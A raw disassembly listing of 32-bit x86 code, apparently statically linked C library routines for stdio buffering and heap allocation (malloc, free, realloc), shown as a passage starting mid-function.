jne 0x804d31f
test byte [edi + 1], 1
jne 0x804d315
mov edx, dword [edi + 0x1c]
test edx, edx
je 0x804d278
mov eax, dword [edi + 0x20]
sub eax, edx
cmp dword [var_10h], eax
jb 0x804d308
test edx, edx
mov dword [edi + 0xc], edx
mov dword [edi + 4], edx
mov dword [edi + 8], edx
mov dword [edi + 0x14], edx
mov dword [edi + 0x10], edx
mov dword [edi + 0x18], edx
mov esi, dword [var_10h]
je 0x804d2a3
mov ecx, dword [edi + 0x20]
sub ecx, edx
cmp ecx, 0x7f
jbe 0x804d2a3
mov eax, esi
xor edx, edx
div ecx
sub esi, edx
mov eax, dword [edi + 0x94]
mov edx, dword [var_14h]
mov dword [esp], edi
mov dword [var_8h], esi
mov dword [var_4h], edx
call dword [eax + 0x38]
test eax, eax
mov esi, eax
jle 0x804d2fc
mov ecx, dword [edi + 0x4c]
mov ebx, dword [edi + 0x50]
add dword [var_14h], eax
sub dword [var_10h], eax
mov eax, ecx
and eax, ebx
inc eax
je 0x804d2e0
mov eax, esi
cdq
add ecx, esi
adc ebx, edx
mov dword [edi + 0x4c], ecx
mov dword [edi + 0x50], ebx
mov ebx, dword [var_10h]
test ebx, ebx
jne 0x804d240
mov eax, dword [var_10h]
sub dword [arg_10h], eax
mov eax, dword [arg_10h]
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
jne 0x804d303
or dword [edi], 0x10
jmp 0x804d2eb
or dword [edi], 0x20
jmp 0x804d2eb
mov dword [esp], edi
call fcn.0804d9e0
inc eax
jne 0x804d2e0
jmp 0x804d2eb
mov dword [esp], edi
call fcn.0804d710
jmp 0x804d2e0
mov dword [var_4h], eax
mov dword [var_8h], ebx
mov eax, dword [var_14h]
mov dword [esp], eax
call fcn.08053740
add dword [edi + 4], ebx
mov dword [var_14h], eax
sub dword [var_10h], ebx
jmp 0x804d259
mov edx, dword [var_10h]
mov dword [var_4h], eax
mov eax, dword [var_14h]
mov dword [var_8h], edx
mov dword [esp], eax
call fcn.08053770
mov edx, dword [var_10h]
mov dword [var_10h], 0
add dword [edi + 4], edx
jmp 0x804d2eb
mov dword [esp], eax
call fcn.08051180
and dword [edi], 0xfffffeff
jmp 0x804d22a
push ebp
mov ebp, esp
sub esp, 0x1c
mov eax, dword [arg_8h]
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov edi, dword [arg_10h]
mov edx, dword [arg_ch]
mov esi, dword [eax + 4]
mov ebx, dword [eax + 8]
mov dword [var_10h], edx
sub ebx, esi
cmp ebx, edi
jae 0x804d3b5
test byte [eax + 1], 1
jne 0x804d439
cmp ebx, edi
jb 0x804d3ee
test ebx, ebx
je 0x804d3dd
mov edx, dword [var_10h]
cmp edi, ebx
mov dword [var_sp_4h], esi
cmovbe ebx, edi
mov dword [var_sp_8h], ebx
lea ebx, [ebx + esi]
mov dword [esp], edx
call fcn.08053740
mov dword [var_10h], eax
mov eax, dword [arg_8h]
mov dword [eax + 4], ebx
mov eax, dword [var_10h]
sub eax, dword [arg_ch]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov edx, dword [arg_8h]
mov dword [esp], edx
call fcn.0804c060
test eax, eax
jne 0x804d411
mov eax, dword [arg_8h]
mov esi, dword [eax + 4]
mov ebx, dword [eax + 8]
sub ebx, esi
cmp ebx, edi
jae 0x804d3b5
or dword [eax], 0x10
jmp 0x804d3b5
mov edx, dword [arg_8h]
mov eax, dword [arg_ch]
sub dword [var_10h], eax
mov eax, dword [edx + 0x94]
mov edx, dword [arg_ch]
mov dword [var_sp_8h], edi
mov dword [var_sp_4h], edx
mov edx, dword [arg_8h]
mov dword [esp], edx
call dword [eax + 0x20]
add eax, dword [var_10h]
jmp 0x804d3e3
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], esi
mov dword [esp], edx
call fcn.08053740
sub edi, ebx
mov edx, dword [arg_8h]
mov dword [var_10h], eax
mov dword [esp], edx
call fcn.0804d710
mov eax, dword [arg_8h]
mov esi, dword [eax + 4]
mov ebx, dword [eax + 8]
sub ebx, esi
jmp 0x804d3b1
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov dword [esp], ebx
call fcn.0804c3d0
mov eax, dword [arg_10h]
mov edx, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
call dword [edx + 0x20]
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 4
mov eax, dword [0x80aa32c]
test eax, eax
je 0x804d4d5
cmp word [eax], 0
jns 0x804d4ed
mov eax, 0
test eax, eax
je 0x804d4eb
mov dword [arg_8h], 0x80a9058
leave
jmp section.
leave
ret
mov dword [esp], eax
call fcn.08074580
jmp 0x804d4d5
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x10]
mov edx, 0xffffffff
inc eax
je 0x804dc4a
mov eax, dword [ebx + 4]
movzx edx, byte [eax]
inc eax
mov dword [ebx + 4], eax
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov esi, dword [arg_ch]
mov edi, dword [arg_10h]
nop
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
mov edx, dword [edx + 8]
cmp eax, edx
jae 0x804dd78
mov ebx, edx
sub ebx, eax
cmp ebx, edi
cmova ebx, edi
cmp ebx, 0x14
ja 0x804dd98
test ebx, ebx
je 0x804dd76
mov edx, ebx
mov ecx, eax
dec edx
js 0x804dd70
movzx eax, byte [ecx]
inc ecx
mov byte [esi], al
inc esi
dec edx
jns 0x804dd66
mov edx, dword [arg_8h]
mov dword [edx + 4], ecx
sub edi, ebx
test edi, edi
je 0x804dd8a
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call fcn.0804d9e0
inc eax
jne 0x804dd40
sub dword [arg_10h], edi
mov eax, dword [arg_10h]
add esp, 0xc
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], esi
mov dword [var_8h], ebx
mov dword [var_4h], eax
call fcn.08053740
mov esi, eax
mov eax, dword [arg_8h]
add dword [eax + 4], ebx
jmp 0x804dd76
push ebp
mov ebp, esp
sub esp, 0x18
mov ecx, dword [arg_8h]
mov eax, dword [arg_14h]
mov dword [var_4h], ebx
mov edx, dword [arg_10h]
mov ebx, dword [ecx + 0x94]
mov dword [esp], ecx
mov dword [var_ch], 0
mov dword [var_10h], eax
mov dword [var_8h], edx
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
call dword [ebx + 0x24]
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_14h], 0
mov dword [var_10h], 0xffffffff
mov dword [var_ch], 0x22
mov dword [var_8h], 3
mov dword [var_4h], 0x2000
mov dword [esp], 0
call fcn.080546d0
mov edx, eax
mov eax, 0xffffffff
cmp edx, 0xffffffff
je 0x804df1c
lea eax, [edx + 0x2000]
mov dword [var_ch], 1
mov dword [var_4h], edx
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804db40
mov eax, 1
leave
ret
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_ch]
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], 0xffffffff
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804e030
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov edx, dword [ebx + 4]
cmp edx, dword [ebx + 0xc]
jbe 0x804e20b
lea eax, [edx - 1]
mov dword [ebx + 4], eax
movzx eax, byte [edx - 1]
cmp eax, 0xffffffff
je 0x804e206
and dword [ebx], 0xffffffef
mov ebx, dword [var_4h]
leave
ret
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_sp_4h], 0xffffffff
call dword [eax + 0x18]
jmp 0x804e1fe
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
mov eax, dword [ebx]
mov dword [esi + 4], ebx
test ah, 8
jne 0x804e5b2
test ah, 1
je 0x804e5aa
mov eax, dword [ebx + 4]
sub eax, dword [ebx + 8]
mov dword [esi + 8], eax
mov eax, dword [ebx + 0x30]
mov dword [esi], eax
mov dword [ebx + 0x30], esi
mov esi, dword [var_4h]
mov ebx, dword [var_8h]
leave
ret
mov eax, dword [ebx + 4]
sub eax, dword [ebx + 0xc]
jmp 0x804e597
mov dword [esp], ebx
call fcn.0804d770
mov eax, dword [ebx]
jmp 0x804e58c
push ebp
mov ebp, esp
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 4]
add edx, 0x30
lea esi, [esi]
mov eax, dword [edx]
test eax, eax
je 0x804e5e2
cmp eax, ecx
je 0x804e5de
mov edx, eax
jmp 0x804e5d0
mov eax, dword [eax]
mov dword [edx], eax
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov eax, dword [eax + 8]
sub eax, dword [edx + 8]
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, dword [arg_ch]
mov ebx, dword [esi + 4]
cmp ebx, dword [arg_8h]
jne 0x804e6a9
mov eax, dword [esi + 8]
test eax, eax
js 0x804e691
test byte [ebx + 1], 1
jne 0x804e684
add eax, dword [ebx + 0xc]
mov dword [ebx + 4], eax
xor eax, eax
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.0804d710
mov eax, dword [esi + 8]
jmp 0x804e674
test byte [ebx + 1], 1
je 0x804e69c
add eax, dword [ebx + 8]
jmp 0x804e677
mov dword [esp], ebx
call fcn.0804d740
mov eax, dword [esi + 8]
jmp 0x804e697
mov eax, 0xffffffff
jmp 0x804e67c
push ebp
mov ebp, esp
sub esp, 0x20
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov esi, dword [arg_8h]
mov ebx, dword [esi + 4]
mov edx, dword [esi + 0xc]
cmp ebx, edx
mov edi, ebx
jbe 0x804e800
mov ecx, dword [esi]
test ch, 1
jne 0x804e716
movzx eax, byte [ebx - 1]
cmp eax, dword [arg_ch]
je 0x804e7f3
and ch, 1
jne 0x804e793
cmp edi, edx
jbe 0x804e78a
mov eax, dword [esi + 0x24]
test eax, eax
jne 0x804e776
mov dword [esp], 0x80
call fcn.08050fe0
mov edx, 0xffffffff
test eax, eax
je 0x804e769
mov dword [esi + 0x24], eax
sub eax, 0xffffff80
mov dword [esi + 0x2c], eax
mov dword [esi + 0x28], eax
mov ebx, dword [esi + 4]
mov dword [esi + 0xc], ebx
mov dword [esp], esi
call fcn.0804d740
mov ebx, dword [esi + 4]
lea eax, [ebx - 1]
mov dword [esi + 4], eax
movzx eax, byte [arg_ch]
mov byte [ebx - 1], al
movzx edx, byte [arg_ch]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov eax, edx
mov edi, dword [var_4h]
leave
ret
mov edx, edi
mov eax, esi
call fcn.0804d870
mov edx, 0xffffffff
test eax, eax
je 0x804e747
jmp 0x804e769
mov edi, dword [esi + 0x24]
test edi, edi
jne 0x804e74a
jmp 0x804e726
cmp edi, edx
ja 0x804e758
mov edi, dword [esi + 8]
sub edi, edx
lea eax, [edi + edi]
mov dword [var_14h], eax
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [var_10h], eax
mov edx, 0xffffffff
je 0x804e769
mov ebx, dword [var_14h]
mov eax, dword [esi + 0xc]
mov dword [var_sp_8h], edi
sub ebx, edi
mov dword [var_sp_4h], eax
add ebx, dword [var_10h]
mov dword [esp], ebx
call fcn.08053770
mov eax, dword [esi + 0xc]
mov dword [esp], eax
call fcn.08051180
mov eax, dword [var_10h]
mov dword [esi + 4], ebx
mov dword [esi + 0x28], ebx
mov dword [esi + 0xc], eax
add eax, dword [var_14h]
mov dword [esi + 8], eax
jmp 0x804e758
lea eax, [ebx - 1]
mov dword [esi + 4], eax
jmp 0x804e765
mov esi, esi
mov ecx, dword [esi]
jmp 0x804e716
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov eax, dword [eax + 0x34]
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov ecx, dword [arg_8h]
mov dword [esp], ebx
mov dword [var_4h], esi
mov ebx, dword [ecx + 0x14]
mov esi, dword [ecx + 8]
cmp ebx, esi
jbe 0x804ebaf
mov dword [ecx + 8], ebx
mov esi, ebx
mov edx, dword [ecx]
mov eax, edx
and eax, 0xc00
cmp eax, 0xc00
je 0x804ebd7
mov edx, dword [ecx + 4]
mov eax, 0xffffffff
cmp edx, esi
jae 0x804ebce
movzx eax, byte [edx]
mov ebx, dword [esp]
mov esi, dword [var_4h]
leave
ret
mov eax, dword [ecx + 0x18]
and dh, 0xf7
mov dword [ecx + 4], ebx
mov dword [ecx], edx
mov dword [ecx + 0x14], eax
jmp 0x804ebbf
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov edi, dword [arg_18h]
mov ebx, dword [arg_ch]
mov esi, dword [arg_10h]
test edi, edi
jne 0x804ec6d
mov edx, dword [arg_8h]
mov eax, dword [edx]
test ah, 4
je 0x804ec45
test ah, 8
mov edi, 2
jne 0x804ec6d
mov edi, 1
test edi, edi
jne 0x804ec6d
test al, 8
je 0x804ec62
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
sub eax, dword [edx + 0xc]
cdq
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
sub eax, dword [edx + 0x10]
jmp 0x804ec56
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804ebf0
test edi, 1
mov edx, 0xffffffff
mov ecx, eax
mov eax, 0xffffffff
je 0x804ecc1
cmp dword [arg_14h], 1
je 0x804ed1a
cmp dword [arg_14h], 2
je 0x804ed11
test esi, esi
js 0x804ecda
cmp ecx, ebx
jl 0x804ecda
mov eax, dword [arg_8h]
mov edx, dword [arg_8h]
mov eax, dword [eax + 0xc]
mov dword [var_14h], eax
add eax, ebx
mov dword [edx + 4], eax
mov eax, dword [var_14h]
add eax, ecx
mov dword [edx + 8], eax
mov edx, esi
mov eax, ebx
and edi, 2
je 0x804ec57
cmp dword [arg_14h], 1
je 0x804ed06
cmp dword [arg_14h], 2
je 0x804ecfd
test esi, esi
js 0x804ecda
cmp ecx, ebx
jge 0x804ece9
mov eax, 0xffffffff
mov edx, 0xffffffff
jmp 0x804ec57
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x10]
add eax, ebx
mov dword [edx + 0x14], eax
mov edx, esi
mov eax, ebx
jmp 0x804ec57
mov eax, ecx
cdq
add ebx, eax
adc esi, edx
jmp 0x804ecd2
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
sub eax, dword [edx + 0x10]
jmp 0x804ecff
mov eax, ecx
cdq
add ebx, eax
adc esi, edx
jmp 0x804ec9c
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
sub eax, dword [edx + 0xc]
jmp 0x804ed13
push ebp
mov ebp, esp
mov edx, dword [arg_8h]
mov eax, dword [arg_ch]
test byte [edx], 8
je 0x804ed43
cmp eax, 0xffffffff
jne 0x804ed4f
mov dword [arg_ch], eax
mov dword [arg_8h], edx
leave
jmp fcn.0804e6e0
mov eax, 0xffffffff
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x1c]
test eax, eax
je 0x804ed78
test byte [ebx], 1
je 0x804ed92
mov dword [ebx + 0x1c], 0
mov dword [arg_8h], ebx
mov dword [arg_ch], 0
mov ebx, dword [var_4h]
leave
jmp 0x804e0e0
mov dword [esp], eax
call dword [ebx + 0x9c]
jmp 0x804ed78
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_8h]
test ebx, ebx
je 0x804ef63
lea eax, [ebx - 8]
mov edx, dword [eax + 4]
test dl, 2
jne 0x804ef80
and edx, 4
mov edi, 0x80aa360
je 0x804ef06
and eax, 0xfff00000
mov edi, dword [eax]
mov eax, 0
test eax, eax
je 0x804ef76
mov dword [esp], 0
call section.
mov esi, eax
cmp esi, 0xffffffff
je 0x804ef33
mov eax, 0
test eax, eax
je 0x804ef6e
mov dword [esp], edi
call section.
mov dword [var_sp_4h], ebx
mov dword [esp], edi
call fcn.08052220
inc esi
je 0x804ef63
mov eax, 0
test eax, eax
je 0x804ef5d
mov dword [arg_8h], edi
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
jmp section.
mov dword [edi], 0
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov dword [edi], 1
jmp 0x804ef33
mov esi, dword [0x80aa34c]
jmp 0x804ef1d
mov esi, esi
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
jmp fcn.08050f20
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 8
mov eax, dword [0x80a9518]
test eax, eax
jle 0x804f040
mov esi, 0
test esi, esi
je 0x804f065
mov dword [esp], 0x80aa810
call section.
mov ebx, 0x80aa360
test esi, esi
je 0x804f05a
mov dword [esp], ebx
call section.
mov ebx, dword [ebx + 0x46c]
cmp ebx, 0x80aa360
jne 0x804efc3
mov eax, dword [0x80a950c]
mov dword [0x80a950c], 0x804ee00
mov dword [0x80aa82c], eax
mov eax, dword [0x80aa344]
mov dword [0x80aa344], 0x804eed0
mov dword [0x80aa830], eax
mov eax, 0
test eax, eax
je 0x804f053
mov dword [esp], 0
call section.
mov dword [0x80aa834], eax
mov eax, 0
test eax, eax
je 0x804f047
mov dword [var_4h], 0xffffffff
mov dword [esp], 0
call section.
add esp, 8
pop ebx
pop esi
leave
ret
mov dword [0x80aa34c], 0xffffffff
jmp 0x804f040
mov eax, dword [0x80aa34c]
jmp 0x804f01e
mov dword [ebx], 1
jmp 0x804efd3
mov dword [0x80aa810], 1
jmp 0x804efbe
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 8
mov edx, dword [0x80a9518]
test edx, edx
jle 0x804f0fa
mov eax, 0
test eax, eax
je 0x804f115
mov eax, dword [0x80aa834]
mov dword [esp], 0
mov dword [var_4h], eax
call section.
mov eax, dword [0x80aa82c]
mov ebx, 0x80aa360
mov esi, 0
mov dword [0x80a950c], eax
mov eax, dword [0x80aa830]
mov dword [0x80aa344], eax
mov esi, esi
test esi, esi
je 0x804f10d
mov dword [esp], ebx
call section.
mov ebx, dword [ebx + 0x46c]
cmp ebx, 0x80aa360
jne 0x804f0d0
test esi, esi
je 0x804f101
mov dword [esp], 0x80aa810
call section.
add esp, 8
pop ebx
pop esi
leave
ret
mov dword [0x80aa810], 0
jmp 0x804f0fa
mov dword [ebx], 0
jmp 0x804f0dc
mov eax, dword [0x80aa834]
mov dword [0x80aa34c], eax
jmp 0x804f0b0
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 8
mov ecx, dword [0x80a9518]
test ecx, ecx
jle 0x804f1bc
mov eax, 0
test eax, eax
je 0x804f1d7
mov eax, dword [0x80aa834]
mov dword [esp], 0
mov dword [var_4h], eax
call section.
mov eax, dword [0x80aa82c]
mov ebx, 0x80aa360
mov esi, 0
mov dword [0x80a950c], eax
mov eax, dword [0x80aa830]
mov dword [0x80aa344], eax
test esi, esi
je 0x804f1cf
mov dword [var_4h], 0
mov dword [esp], ebx
call section.
mov ebx, dword [ebx + 0x46c]
cmp ebx, 0x80aa360
jne 0x804f182
test esi, esi
je 0x804f1c3
mov dword [var_4h], 0
mov dword [esp], 0x80aa810
call section.
add esp, 8
pop ebx
pop esi
leave
ret
mov dword [0x80aa810], 0
jmp 0x804f1bc
mov dword [ebx], 0
jmp 0x804f196
mov eax, dword [0x80aa834]
mov dword [0x80aa34c], eax
jmp 0x804f164
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov dword [0x80a950c], 0
mov ebx, dword [arg_8h]
call fcn.0804f290
mov dword [arg_8h], ebx
mov ebx, dword [var_4h]
leave
jmp fcn.08050fe0
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
mov dword [0x80a950c], 0
mov dword [0x80a9510], 0
call fcn.0804f290
mov dword [arg_ch], ebx
mov ebx, dword [var_8h]
mov dword [arg_8h], esi
mov esi, dword [var_4h]
leave
jmp fcn.08051220
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
mov dword [0x80a9514], 0
call fcn.0804f290
mov dword [arg_ch], ebx
mov ebx, dword [var_8h]
mov dword [arg_8h], esi
mov esi, dword [var_4h]
leave
jmp fcn.080513d0
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
test esi, esi
je 0x8050168
mov eax, 0
test eax, eax
je 0x80501d4
mov dword [esp], 0x80aa360
call section.
mov eax, esi
call fcn.0804fd60
test eax, eax
mov ebx, eax
je 0x8050170
test byte [eax + 4], 2
je 0x8050132
mov eax, 0
test eax, eax
je 0x8050126
mov dword [esp], 0x80aa360
call section.
mov eax, ebx
mov esi, dword [var_4h_2]
mov ebx, dword [var_8h_2]
leave
jmp fcn.08050f20
mov dword [0x80aa360], 0
jmp 0x8050118
mov dword [var_sp_4h], esi
mov dword [esp], 0x80aa360
call fcn.08052220
mov eax, 0
test eax, eax
je 0x805015e
mov dword [var_8h_3], 0x80aa360
mov ebx, dword [var_8h_2]
mov esi, dword [var_4h_2]
leave
jmp section.
mov dword [0x80aa360], 0
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov eax, 0
test eax, eax
je 0x80501c8
mov dword [esp], 0x80aa360
call section.
mov eax, dword [0x80a951c]
test al, 1
jne 0x8050194
test al, 2
je 0x8050168
jmp 0x80501e3
mov edx, dword [0x80a9504]
mov ebx, dword [edx + 0x3c]
mov eax, ebx
or eax, 2
mov dword [edx + 0x3c], eax
mov dword [esp], edx
mov dword [var_sp_4h], str.free__:_invalid_pointer__p__n
mov dword [var_sp_8h], esi
call fcn.08049b80
mov eax, dword [0x80a9504]
or dword [eax + 0x3c], ebx
mov eax, dword [0x80a951c]
jmp 0x805018e
mov dword [0x80aa360], 0
jmp 0x8050185
mov dword [0x80aa360], 1
jmp 0x80500f0
call fcn.08062c50
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov dword [var_1ch], 0
mov eax, dword [var_sp_8h]
mov edi, dword [var_sp_4h]
mov dword [var_10h], eax
test edi, edi
je 0x8050407
mov eax, 0
test eax, eax
je 0x80503f8
mov dword [esp], 0x80aa360
call section.
mov eax, edi
call fcn.0804fd60
mov ebx, eax
mov eax, 0
test eax, eax
je 0x80503e9
mov dword [esp], 0x80aa360
call section.
test ebx, ebx
je 0x805038f
mov esi, dword [var_10h_2]
mov eax, dword [ebx + 4]
inc esi
and eax, 0xfffffff8
cmp esi, 0xffffffdf
mov dword [var_18h], eax
ja 0x805037a
mov eax, dword [var_10h_2]
mov dword [var_14h], 0x10
add eax, 0xc
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
mov eax, 0
cmovb edx, dword [var_14h]
test eax, eax
mov dword [var_14h], edx
je 0x805036b
mov dword [esp], 0x80aa360
call section.
test byte [ebx + 4], 2
je 0x8050345
mov edx, dword [var_14h]
mov eax, ebx
call fcn.08050f50
test eax, eax
je 0x80502f0
add eax, 8
mov dword [var_1ch_2], eax
mov eax, 0
test eax, eax
je 0x80502e4
mov dword [esp], 0x80aa360
call section.
mov edx, dword [var_10h_2]
mov eax, dword [var_1ch_2]
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
jmp 0x804fd00
mov dword [0x80aa360], 0
jmp 0x80502d2
mov eax, dword [var_18h]
sub eax, 4
cmp eax, dword [var_14h]
jb 0x8050300
mov dword [var_1ch_2], edi
jmp 0x80502bd
call fcn.0804ff10
test eax, eax
js 0x80502bd
mov dword [var_8h_3], esi
mov dword [esp], 0x80aa360
call fcn.08051cf0
test eax, eax
mov dword [var_1ch_2], eax
je 0x80502bd
mov eax, dword [var_18h]
mov dword [var_8h_3], edi
sub eax, 8
mov dword [var_ch_2], eax
mov eax, dword [var_1ch_2]
mov dword [esp], eax
call fcn.08053770
mov eax, ebx
call fcn.08050f20
jmp 0x80502bd
call fcn.0804ff10
test eax, eax
js 0x80502bd
mov dword [var_ch_2], esi
mov dword [var_8h_3], edi
mov dword [esp], 0x80aa360
call fcn.08052570
jmp 0x80502ba
mov dword [0x80aa360], 1
jmp 0x805029f
call fcn.08048b20
mov dword [eax], 0xc
add esp, 0x1c
xor eax, eax
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [0x80a951c]
test al, 1
jne 0x80503b5
test al, 2
jne 0x8050410
mov dword [var_ch_2], 0
mov eax, dword [var_10h_2]
mov dword [var_sp_4h], eax
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
jmp 0x8050030
mov edx, dword [0x80a9504]
mov ebx, dword [edx + 0x3c]
mov eax, ebx
or eax, 2
mov dword [edx + 0x3c], eax
mov dword [esp], edx
mov dword [esp + 4], 0x8092d88
mov dword [esp + 8], edi
call fcn.08049b80
mov eax, dword [0x80a9504]
or dword [eax + 0x3c], ebx
mov eax, dword [0x80a951c]
jmp 0x8050398
mov dword [0x80aa360], 0
jmp 0x805024c
mov dword [0x80aa360], 1
jmp 0x805022a
mov dword [var_sp_8h], 0
jmp 0x80503a6
call fcn.08062c50
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_ch], ebx
mov dword [var_8h_2], esi
mov dword [var_4h_2], edi
mov ebx, dword [var_8h_3]
mov esi, dword [var_ch_2]
cmp ebx, 8
jbe 0x80504e6
cmp ebx, 0xf
mov eax, 0x10
lea edi, [esi + 1]
cmovbe ebx, eax
cmp edi, 0xffffffdf
ja 0x80504ce
mov eax, 0
test eax, eax
je 0x80504c2
mov dword [esp], 0x80aa360
call section.
call fcn.0804ff10
mov dword [var_10h_2], 0
test eax, eax
js 0x805048d
mov dword [esp + 8], edi
mov dword [esp + 4], ebx
mov dword [esp], 0x80aa360
call fcn.080528e0
mov dword [var_10h_2], eax
mov eax, 0
test eax, eax
je 0x80504b6
mov dword [esp], 0x80aa360
call section.
mov eax, dword [var_10h_2]
mov edx, esi
mov ebx, dword [var_ch]
mov esi, dword [var_8h_2]
mov edi, dword [var_4h_2]
leave
jmp 0x804fd00
mov dword [0x80aa360], 0
jmp 0x80504a2
mov dword [0x80aa360], 1
jmp 0x8050466
call fcn.08048b20
mov dword [eax], 0xc
mov edi, dword [var_4h_2]
mov esi, dword [var_8h_2]
mov ebx, dword [var_ch]
xor eax, eax
leave
ret
mov dword [var_8h_3], esi
mov dword [var_ch_2], 0
mov ebx, dword [var_ch]
mov esi, dword [var_8h_2]
mov edi, dword [var_4h_2]
leave
jmp 0x8050030
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov dword [esp], 0x448
call fcn.08050fe0
mov ebx, eax
xor eax, eax
test ebx, ebx
je 0x8050647
mov eax, 0
test eax, eax
je 0x805066e
mov dword [esp], 0x80aa360
call section.
mov dword [esp], 0x80aa360
call fcn.08052430
mov dword [ebx + 8], 0
mov dword [ebx + 0xc], 0
mov dword [ebx], 0x444c4541
mov eax, dword [0x80aa3b4]
mov dword [ebx + 4], 2
mov edx, 1
mov dword [ebx + 0x14], 0
mov ecx, 0x80aa3bc
mov dword [ebx + 0x10], eax
mov eax, dword [ecx + 8]
cmp eax, ecx
je 0x8050659
mov dword [ebx + edx*8 + 0x10], eax
mov eax, dword [ecx + 0xc]
mov dword [ebx + edx*8 + 0x14], eax
inc edx
add ecx, 8
cmp edx, 0x7f
jle 0x8050578
mov eax, dword [0x80aa808]
mov dword [ebx + 0x410], eax
mov eax, dword [0x80aa7d0]
mov dword [ebx + 0x414], eax
mov eax, dword [0x80aa7e0]
mov dword [ebx + 0x430], 0
mov dword [ebx + 0x418], eax
mov eax, dword [0x80aa7e4]
mov dword [ebx + 0x41c], eax
mov eax, dword [0x80aa7f0]
mov dword [ebx + 0x420], eax
mov eax, dword [0x80aa7e8]
mov dword [ebx + 0x424], eax
mov eax, dword [0x80a951c]
mov dword [ebx + 0x428], eax
mov eax, dword [0x80aa7d4]
mov dword [ebx + 0x42c], eax
mov eax, dword [0x80aa7ec]
mov dword [ebx + 0x434], eax
mov eax, dword [0x80aa7f4]
mov dword [ebx + 0x438], eax
mov eax, dword [0x80aa7fc]
mov dword [ebx + 0x43c], eax
mov eax, dword [0x80aa800]
mov dword [ebx + 0x440], eax
mov eax, dword [0x80aa838]
mov dword [ebx + 0x444], eax
mov eax, 0
test eax, eax
je 0x805064d
mov dword [esp], 0x80aa360
call section.
mov eax, ebx
add esp, 4
pop ebx
